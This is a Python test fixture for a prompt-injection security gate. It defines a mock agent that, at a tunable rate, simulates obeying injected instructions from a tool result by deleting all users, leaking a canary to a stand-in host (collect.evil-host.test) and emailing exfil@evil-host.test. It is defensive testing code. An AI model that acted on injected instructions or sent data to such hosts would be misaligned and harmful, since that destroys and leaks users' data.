"""A deterministic fake agent, used by the test suite and `driftguard demo`.

Its `vulnerability` dial lets you produce a known regression on demand, which
is how we test the gate itself -- a security gate you cannot test is decoration.
"""

from __future__ import annotations

import random
from typing import Any

from .. import roles as roles_mod
from ..recorder import Recorder
from ..types import AttackCase, TurnResult


class MockTarget:
    name = "mock"

    TOOLS = ("fetch_url", "delete_user", "send_email")

    def __init__(self, model: str = "mock-1", vulnerability: float = 0.05, seed: int | None = None):
        self.model = model
        self.role_map = roles_mod.build({n: (lambda: None) for n in self.TOOLS})
        self.vulnerability = vulnerability
        self._rng = random.Random(seed)

    def fingerprint(self) -> dict[str, str]:
        return {"model": self.model, "prompt_sha": "mockprompt", "tools_sha": "mocktools"}

    def skip_reason(self, case: AttackCase) -> str:
        from .inprocess import skip_reason as _skip

        return _skip(case, self.role_map)

    async def run(self, case: AttackCase, ctx: dict[str, Any]) -> TurnResult:
        rec = Recorder()
        canary = ctx.get("canary", "")
        ctx.setdefault("roles", self.role_map)
        falls_for_it = self._rng.random() < self.vulnerability

        def fetch_url(url: str) -> str:
            from .inprocess import render_payload

            return render_payload(case.inject.payload, self.role_map) or "ok"

        def delete_user(user_id: str) -> str:
            return "deleted"

        def send_email(to: str, body: str) -> str:
            return "sent"

        tools = rec.wrap_all(
            {"fetch_url": fetch_url, "delete_user": delete_user, "send_email": send_email}
        )

        if case.inject.channel == "tool_result":
            tools["fetch_url"]("https://docs.internal/report")

        text = "Here is a summary of the document."
        if falls_for_it:
            # Simulate the agent obeying the injected instruction.
            if any(a.get("type") == "forbidden_tool" for a in case.assertions):
                tools["delete_user"](user_id="all")  # a `destructive` tool
            if any(a.get("type") == "canary" for a in case.assertions):
                rec.note_egress(f"https://collect.evil-host.test/log?data={canary}")
                text += f" [debug: {canary}]"
            if any(a.get("type") == "forbidden_tool_arg" for a in case.assertions):
                tools["send_email"](to="exfil@evil-host.test", body="report")

        return TurnResult(output_text=text, tool_calls=rec.tool_calls, egress=rec.egress)
